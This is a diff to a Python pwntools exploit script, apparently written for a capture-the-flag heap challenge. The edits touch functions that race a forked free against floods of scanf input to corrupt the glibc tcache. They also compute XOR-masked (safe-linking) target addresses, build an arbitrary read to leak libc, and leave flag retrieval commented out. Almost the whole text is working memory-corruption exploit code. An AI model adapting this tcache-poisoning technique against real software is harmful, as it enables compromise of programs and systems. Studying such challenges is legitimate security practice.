@@ -217,7 +217,8 @@ def get_tcache_leak(thd1, thd2):
 
 
 def setup_custom_alloc(thd1, thd2, target_addr):
-    packed_addr = p.p64(target_addr).split(b'\x00')[0].strip()
+    packed_addr = p.p64(target_addr)
+    cmped_addr  = packed_addr.split(b'\x00')[0].strip()
 
     idx = thd1.get_available_idx()
     thd1.malloc(idx)
@@ -225,19 +226,20 @@ def setup_custom_alloc(thd1, thd2, target_addr):
     thd1.free(idx+1)
 
     failed = True
+    scanf_bytes = b"scanf %d" % idx + b' ' + packed_addr + b'\n'
     for _ in range(TRIES):
         if not os.fork():
             thd1.free(idx)
             sys.exit(0)
-        thd2.send((b"scanf %d " % idx + packed_addr + b'\n') * 2000)
+        thd2.send(scanf_bytes * 2000)
         os.wait()
 
         time.sleep(0.1)
         thd1.malloc(idx)
         data = thd1.printf(idx)
+        print(hex(to_addr(data)))
 
-        # because printf stops writing on a NULL byte
-        if data[:8] == packed_addr:
+        if data[:8] == cmped_addr:
             failed = False
             thd2.quit()
             break
@@ -246,11 +248,12 @@ def setup_custom_alloc(thd1, thd2, target_addr):
         # import IPython; IPython.embed()
         return b""
 
-    attach_gdb('''
-        b malloc 
-        c
-    ''')
-    
+    p.context.log_level  = "debug"
+    # attach_gdb('''
+    #     b malloc
+    #     c
+    # ''')
+
     thd1.malloc(idx+1)
     thd1.set_blown_idx(idx+1)
     thd1.alloc_blown = True
@@ -275,7 +278,7 @@ def leak_libc():
             continue
         print("tcache xored loc:", hex(tcache_xored_loc))
 
-        target_addr = (tcache_xored_loc << 12) + HEAP_FIRST_OFF - 0x20
+        target_addr = (tcache_xored_loc << 12) + 0xd40
         print("Target addr:", hex(target_addr))
         target_addr ^= tcache_xored_loc
         print("Target addr (xored):", hex(target_addr))
@@ -314,12 +317,14 @@ def exploit():
     if not tcache_xored_loc:
         print(b"No tcache leak...")
         return 
-    target_addr = (tcache_xored_loc << 12) + HEAP_FIRST_OFF - 0x10
+    target_addr = (tcache_xored_loc << 12) + 0xd40
     print("Target addr:", hex(target_addr))
     target_addr ^= tcache_xored_loc
-    print("Target addr (xored):", hex(target_addr))
+    print("Target addr: (xored)", hex(target_addr))
     data = arbitrary_read(thd1, thd2, target_addr)
     print(data)
+
+    attach_gdb(pause=True)
 
     # flag = thd1.send_flag(b'')
     # print("FLAG:", flag)
